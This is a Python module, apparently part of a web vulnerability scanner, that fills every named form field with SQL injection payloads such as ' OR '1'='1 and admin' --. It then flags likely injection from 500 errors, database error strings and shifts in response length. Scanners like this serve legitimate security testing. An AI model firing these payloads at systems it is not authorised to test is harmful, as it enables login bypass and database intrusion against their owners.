import os
import requests
from urllib.parse import urljoin

SQL_ERRORS = [
    "sql syntax",
    "mysql",
    "syntax error",
    "unclosed quotation mark",
    "ora-",
    "sqlite",
]


def load_payloads(path=None):
    path = path or os.path.join("payloads", "sqli.txt")
    try:
        with open(path, "r", encoding="utf-8") as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        return ["' OR '1'='1", '" OR "1"="1', "'--", "admin' --", "' OR 1=1--"]


def build_form_data(inputs, payload):
    data = {}
    for input_field in inputs:
        name = input_field.get("name")
        if name:
            data[name] = payload
    return data


def test_sqli(url, forms):
    payloads = load_payloads()
    vulnerabilities = []

    for form in forms:
        action = form["action"]
        method = form["method"]
        target_url = urljoin(url, action)

        print(f"\n[+] Testing SQL Injection -> {target_url}")
        print(f"[+] Method -> {method.upper()}\n")

        baseline_length = None

        for payload in payloads:
            data = build_form_data(form["inputs"], payload)

            if not data:
                print("[WARN] Form has no named inputs; skipping SQLi payloads.")
                break

            print(f"[PAYLOAD] {payload}")
            print(f"[DATA] {data}")

            try:
                if method == "post":
                    response = requests.post(target_url, data=data, timeout=10)
                else:
                    response = requests.get(target_url, params=data, timeout=10)

                response_text = response.text.lower()
                current_length = len(response.text)

                print(f"[STATUS] {response.status_code}")
                print(f"[LENGTH] {current_length}\n")

                if baseline_length is None:
                    baseline_length = current_length

                difference = abs(current_length - baseline_length)

                if difference > 10:
                    print(f"[!!!] Suspicious response difference: {difference}\n")
                    vulnerabilities.append({
                        "type": "Possible SQL Injection",
                        "url": target_url,
                        "payload": payload,
                        "difference": difference
                    })

                if response.status_code == 500:
                    print(f"[!!!] Possible SQLi Found (500 Error)!\n")
                    vulnerabilities.append({
                        "type": "SQL Injection",
                        "url": target_url,
                        "payload": payload,
                        "error": "500 Internal Server Error"
                    })

                for error in SQL_ERRORS:
                    if error in response_text:
                        print(f"[!!!] Possible SQLi Found! DB Error: {error}\n")
                        vulnerabilities.append({
                            "type": "SQL Injection",
                            "url": target_url,
                            "payload": payload,
                            "error": error
                        })
                        break

            except Exception as e:
                print(f"[ERROR] SQLi test failed: {e}")

    return vulnerabilities